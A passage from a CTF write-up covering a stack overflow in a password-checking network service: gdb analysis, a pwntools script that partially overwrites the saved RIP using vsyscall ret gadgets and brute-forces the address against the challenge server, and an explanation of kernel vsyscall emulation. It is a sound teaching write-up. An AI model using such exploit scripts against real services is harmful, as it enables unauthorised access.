<span class="line"><span style="color:#80A665">  negchke</span><span style="color:#666666">(</span><span style="color:#80A665">bind</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ssock</span><span style="color:#666666">,</span><span style="color:#666666"> (</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr </span><span style="color:#CB7676">*</span><span style="color:#666666">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">)),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to bind</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  negchke</span><span style="color:#666666">(</span><span style="color:#80A665">listen</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ssock</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to listen</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">  signal</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">SIGCHLD</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SIG_IGN</span><span style="color:#666666">);</span><span style="color:#758575DD"> /* no zombies */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">  while</span><span style="color:#666666"> (</span><span style="color:#4C9A91">1</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> client_fd </span><span style="color:#666666">=</span><span style="color:#80A665"> negchke</span><span style="color:#666666">(</span><span style="color:#80A665">accept</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ssock</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to accept</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">    pid_t</span><span style="color:#DBD7CAEE"> pid </span><span style="color:#666666">=</span><span style="color:#80A665"> negchke</span><span style="color:#666666">(</span><span style="color:#80A665">fork</span><span style="color:#666666">(),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to fork</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">pid </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">      close</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ssock</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">      negchke</span><span style="color:#666666">(</span><span style="color:#80A665">dup2</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to dup2</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">      negchke</span><span style="color:#666666">(</span><span style="color:#80A665">dup2</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to dup2</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">      close</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">      negchke</span><span style="color:#666666">(</span><span style="color:#80A665">execl</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/proc/self/exe</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">reexec</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to reexec</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">      return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#80A665">    close</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>In short, our service compares the password we enter with the real password read from the file, and if the password is correct it gives us the flag. I wonder if there’s a way to skip that require_auth() function… Wait, are you sure that you really want to read 90 characters on a 50 characters buffer if the user supply a wrong password length? I thought we were here to learn secure coding, but an attacker can easily control the saved RIP and control the program flow!</p>
<h1 id="analyzing-the-vulnerability">Analyzing the vulnerability</h1>
<p>The following python script will send 90 characters to the service.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">host </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">localhost</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#DBD7CAEE">port </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1514</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">host</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cyclic</span><span style="color:#666666">(</span><span style="color:#4C9A91">90</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">password: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">55</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#BD976A">raw_input</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#DBD7CAEE"> conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#666666">(</span><span style="color:#4C9A91">4000</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>To understand how many characters we have to push before the saved RIP, we’re gonna need gdb. We will use it to connect to the service just after we send the payload to analyze the stack just before the check_password_correct() function returns:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ ps -a | grep exe</span></span>
<span class="line"><span>8214 pts/1    00:00:00 exe</span></span>
<span class="line"><span>$ sudo gdb attach 8214</span></span>
<span class="line"><span>gdb-peda$ disas check_password_correct </span></span>
<span class="line"><span>Dump of assembler code for function check_password_correct:</span></span>
<span class="line"><span>0x00007f4713575ed2 &#x3C;+0>: sub    rsp,0x58</span></span>
<span class="line"><span>[...]</span></span>
<span class="line"><span>0x00007f4713575fa8 &#x3C;+214>: call   0x7f4713575c80 &#x3C;strcmp@plt></span></span>
<span class="line"><span>0x00007f4713575fad &#x3C;+219>: test   eax,eax</span></span>
<span class="line"><span>0x00007f4713575faf &#x3C;+221>: sete   al</span></span>
<span class="line"><span>0x00007f4713575fb2 &#x3C;+224>: movzx  eax,al</span></span>
<span class="line"><span>0x00007f4713575fb5 &#x3C;+227>: add    rsp,0x58</span></span>
<span class="line"><span>0x00007f4713575fb9 &#x3C;+231>: ret</span></span>
<span class="line"><span></span></span>
<span class="line"><span>gdb-peda$ b *check_password_correct + 231</span></span>
<span class="line"><span>Breakpoint 1 at 0x7f4713575fb9</span></span>
<span class="line"><span>gdb-peda$ continue</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Breakpoint 1, 0x00007f4713575fb9 in check_password_correct ()</span></span>
<span class="line"><span>gdb-peda$ x/10gx $rsp</span></span>
<span class="line"><span>0x7ffd46f25108: 0x6161617461616173  0x6161617661616175</span></span>
<span class="line"><span>0x7ffd46f25118: 0x00007f98631f6177  0x00000000ffffffff</span></span>
<span class="line"><span>0x7ffd46f25128: 0x00007ffd46f25101  0x00007ffd46f272b6</span></span>
<span class="line"><span>0x7ffd46f25138: 0x0000000000000000  0x00007ffd46f252c8</span></span>
<span class="line"><span>0x7ffd46f25148: 0x00007f98631f8469  0x00007ffd46f272b6</span></span>
<span class="line"><span></span></span></code></pre>
<p>The first thing we notice here is that we overwrote the return address from check_password_correct with 0x6161617461616173, that is the hex for ‘aaataaas’. Using cyclic_find we can easily understand how many characters we have to write before our forged RIP:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>>>> from pwn import *</span></span>
<span class="line"><span>>>> unhex('6161617461616173')</span></span>
<span class="line"><span>'aaataaas'</span></span>
<span class="line"><span>>>> cyclic_find('saaa')</span></span>
<span class="line"><span>72</span></span>
<span class="line"><span></span></span></code></pre>
<p>So, we have to write 72 characters before the RIP.
We can also notice another thing: 0x7ffd46f25118 is very similar to the return address from the require_auth() function, but with the last 2 bytes being overwritten. We can easily verify this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gdb-peda$ disas handle_request</span></span>
<span class="line"><span>Dump of assembler code for function handle_request:</span></span>
<span class="line"><span>[...]</span></span>
<span class="line"><span>0x00007f98631f807a &#x3C;+160>: lea    rdi,[rip+0x3a7]        # 0x7f98631f8428</span></span>
<span class="line"><span>0x00007f98631f8081 &#x3C;+167>: call   0x7f98631f7bc0 &#x3C;puts@plt></span></span>
<span class="line"><span>0x00007f98631f8086 &#x3C;+172>: call   0x7f98631f7fba &#x3C;require_auth></span></span>
<span class="line"><span>0x00007f98631f808b &#x3C;+177>: lea    rsi,[rip+0x36d]        # 0x7f98631f83ff</span></span>
<span class="line"><span>0x00007f98631f8092 &#x3C;+184>: lea    rdi,[rip+0x3b6]        # 0x7f98631f844f</span></span>
<span class="line"><span>0x00007f98631f8099 &#x3C;+191>: call   0x7f98631f7cd0 &#x3C;fopen@plt></span></span>
<span class="line"><span>0x00007f98631f809e &#x3C;+196>: mov    QWORD PTR [rsp+0x40],rax</span></span>
<span class="line"><span>0x00007f98631f80a3 &#x3C;+201>: cmp    QWORD PTR [rsp+0x40],0x0</span></span>
<span class="line"><span>0x00007f98631f80a9 &#x3C;+207>: je     0x7f98631f80c5 &#x3C;handle_request+235></span></span>
<span class="line"><span>[...]</span></span>
<span class="line"><span></span></span></code></pre>
<p>Good! We’re almost there! On the stack we have 0x00007f98631f6177, and we want to return to 0x00007f98631f808b, that is, just after out require_auth() function. We know that pages are aligned, so we know that the last 12 bits of the address where we want to jump to are fixed to 0x08b. We overwrite 16 bits, so we are left with 4 unknown bits… Well, I think that a little of brute force won’t be so bad, after all. Anyway, we still have stuff on the stack (or should I say stackstuff?) that we want to get rid of. If only I could make a pop-ret here!</p>
<h1 id="looking-for-something-useful">Looking for something useful</h1>
<p>We know that PIE is enabled, so addresses are changing everytime, but after all we don’t need that much: pop-ret ret-ret are enough. After a few hours of digging, I found something that could easily bring us to get that damn flag. Running a couple of time the executable and mapping memory sections, I found that the vsyscall memory area had its address fixed</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gdb-peda$ info proc mappings</span></span>
<span class="line"><span>process 8329</span></span>
<span class="line"><span>Mapped address spaces:</span></span>
<span class="line"><span></span></span>
<span class="line"><span>          Start Addr           End Addr       Size     Offset objfile</span></span>
<span class="line"><span>      0x7f9862c07000     0x7f9862dc7000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.21.so</span></span>
<span class="line"><span>      [...]</span></span>
<span class="line"><span>      0x7ffd46f80000     0x7ffd46f82000     0x2000        0x0 [vdso]</span></span>
<span class="line"><span>  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]</span></span>
<span class="line"><span></span></span></code></pre>
<p>I hope that vsyscall has what we’re looking for…</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gdb-peda$ X/20i 0xffffffffff600000</span></span>
<span class="line"><span>   0xffffffffff600000:  mov    rax,0x60</span></span>
<span class="line"><span>   0xffffffffff600007:  syscall </span></span>
<span class="line"><span>   0xffffffffff600009:  ret    </span></span>
<span class="line"><span>   0xffffffffff60000a:  int3   </span></span>
<span class="line"><span>   0xffffffffff60000b:  int3   </span></span>
<span class="line"><span></span></span></code></pre>
<p>Bingo! That’s exactly what we need: a couple of syscall, and we’re good to go.
The first idea was to return twice to 0xffffffffff600009 and then to our handle_request(), just after the require_auth() call.
Keep in mind that we have to bruteforce 16 bits.</p>
<p>After trying we noticed that using 0xffffffffff600009 as a gadget resulted in a segfault.
The reason for this odd behaviour is that starting from linux kernel 3.3/3.4 the vsyscall are emulated using a trap-based mechanism
see <a href="https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf">SROP</a>, <a href="http://lwn.net/Articles/446528/">LWN</a>,
and <a href="http://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/">thisissecurity</a> for more information.</p>
<p>Since we just need to move further the stack to do the partial overwrite we can just call the address of time(…)/gettimeofday(…)/getcpu(…).
We decided to use 0xffffffffff600000 (gettimeofday).
This is possible because in di/si we have an address in a writeable memory page which contains
password and input (more on this later).</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">host </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">school.fluxfingers.net</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#DBD7CAEE">port </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1514</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">ffffffffff600000</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 72</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">\x8b\x10</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">  try</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    conn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">host</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">password: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">55</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#DBD7CAEE"> conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#666666">(</span><span style="color:#4C9A91">4000</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    break</span></span>
<span class="line"><span style="color:#4D9375">  except</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    continue</span></span>
<span class="line"></span></code></pre>
<p>And we have the flag: flag{MoRE_REtuRnY_tHAn_rop}</p>
<p>~ q3_C0d3</p>
<h1 id="why-and-how-does-vsyscall-emulation-work">Why and how does vsyscall emulation work</h1>
<p>The need for vsyscall emulation is as described in the resources mentioned before.</p>
<p>You can see in <a href="https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_emu_64.S#L2">vsyscall_emu_64.S</a>
that the vsyscall page contains the gadget we need.</p>
<p>Though a second look at how emulate_vsyscall is executed in
<a href="https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_64.c#L116">emulate_vsyscall(…)</a>
shows us that a few security checks are in place:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">    vsyscall_nr </span><span style="color:#666666">=</span><span style="color:#80A665"> addr_to_vsyscall_nr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">address</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    trace_emulate_vsyscall</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">vsyscall_nr</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">vsyscall_nr </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        warn_bad_vsyscall</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">KERN_WARNING</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> regs</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                  "</span><span style="color:#C98A7D">misaligned vsyscall (exploit attempt or buggy program) -- look up the vsyscall kernel parameter if you need a workaround</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        goto</span><span style="color:#DBD7CAEE"> sigsegv</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#80A665">get_user</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">caller</span><span style="color:#666666">,</span><span style="color:#666666"> (</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> long</span><span style="color:#DBD7CAEE"> __user </span><span style="color:#CB7676">*</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE">regs</span><span style="color:#CB7676">-></span><span style="color:#BD976A">sp</span><span style="color:#666666">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">        warn_bad_vsyscall</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">KERN_WARNING</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> regs</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                  "</span><span style="color:#C98A7D">vsyscall with bad stack (exploit attempt?)</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        goto</span><span style="color:#DBD7CAEE"> sigsegv</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span></code></pre>
<p>The author of this part of the kernel decided to mantain the same behaviour that a real vsyscall
would have passing a wrong address, issuing a SIGSEGV if the called address is not good.
Instead, as long as the ret instruction is emulated we’re good to go and our exploit will work:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">do_ret:</span></span>
<span class="line"><span style="color:#758575DD">    /* Emulate a ret instruction. */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    regs</span><span style="color:#CB7676">-></span><span style="color:#DBD7CAEE">ip </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> caller</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">    regs</span><span style="color:#CB7676">-></span><span style="color:#DBD7CAEE">sp </span><span style="color:#CB7676">+=</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">sigsegv:</span></span>
<span class="line"><span style="color:#80A665">    force_sig</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">SIGSEGV</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> current</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">}</span></span>
<span class="line"></span></code></pre>
<p><a href="https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_64.c#L74">addr_to_vsyscall(…)</a>
will make sure that the emulated syscall is called starting at the alignment address and be one of the three defined syscalls:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">static</span><span style="color:#CB7676"> int</span><span style="color:#80A665"> addr_to_vsyscall_nr</span><span style="color:#666666">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> long</span><span style="color:#BD976A"> addr</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> nr</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> ~0x</span><span style="color:#4C9A91">C00</span><span style="color:#CB7676">UL</span><span style="color:#666666">)</span><span style="color:#CB7676"> !=</span><span style="color:#DBD7CAEE"> VSYSCALL_ADDR</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE">EINVAL</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    nr </span><span style="color:#666666">=</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">C00</span><span style="color:#CB7676">UL</span><span style="color:#666666">)</span><span style="color:#CB7676"> >></span><span style="color:#4C9A91"> 10</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">nr </span><span style="color:#CB7676">>=</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE">EINVAL</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> nr</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>The last part left to understand how this works is how intructions in the vsyscall area are “trapped”,
to do this we need to look at <a href="https://github.com/torvalds/linux/blob/v4.1/arch/x86/mm/fault.c#L774">fault.c</a>
which is responsible of handing faults, in particular the code which handles this is in the badarea_nosemaphore function,
it will check if the fault comes from an address in the vsyscall area and pass control to the emulate_vsyscall function.</p>
<p>Looks like there is a VMA set up for the emulated vsyscall which explain why you can see this page as r-xp in maps/trace,
but the actual physical page is setup via __set_fixmap:</p>
<p>To explain why we are still able to read the page, but a fault gets generated by the mmu if we try to execute code from the
vsyscall page in emulation mode we need to look at how vsyscall gets mapped in <a href="https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_64.c#L322">map_vsyscall</a>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">vsyscall_mode </span><span style="color:#CB7676">!=</span><span style="color:#DBD7CAEE"> NONE</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#80A665">        __set_fixmap</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">VSYSCALL_PAGE</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> physaddr_vsyscall</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">                 vsyscall_mode </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> NATIVE</span></span>
<span class="line"><span style="color:#CB7676">                 ?</span><span style="color:#DBD7CAEE"> PAGE_KERNEL_VSYSCALL</span></span>
<span class="line"><span style="color:#CB7676">                 :</span><span style="color:#DBD7CAEE"> PAGE_KERNEL_VVAR</span><span style="color:#666666">);</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> __PAGE_KERNEL_VSYSCALL</span><span style="color:#666666">      (</span><span style="color:#DBD7CAEE">__PAGE_KERNEL_RX </span><span style="color:#CB7676">|</span><span style="color:#DBD7CAEE"> _PAGE_USER</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> __PAGE_KERNEL_VVAR</span><span style="color:#666666">      (</span><span style="color:#DBD7CAEE">__PAGE_KERNEL_RO </span><span style="color:#CB7676">|</span><span style="color:#DBD7CAEE"> _PAGE_USER</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Depending on the vsyscall_mode the physical page will have different permissions.</p>
<p>Thanks to TheJH from FluxFingers (the author of the challenge) for his help on writing this part of the writeup!</p>
<p>~ ocean</p>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
&copy; 2025 Tower of Hanoi. All rights reserved.
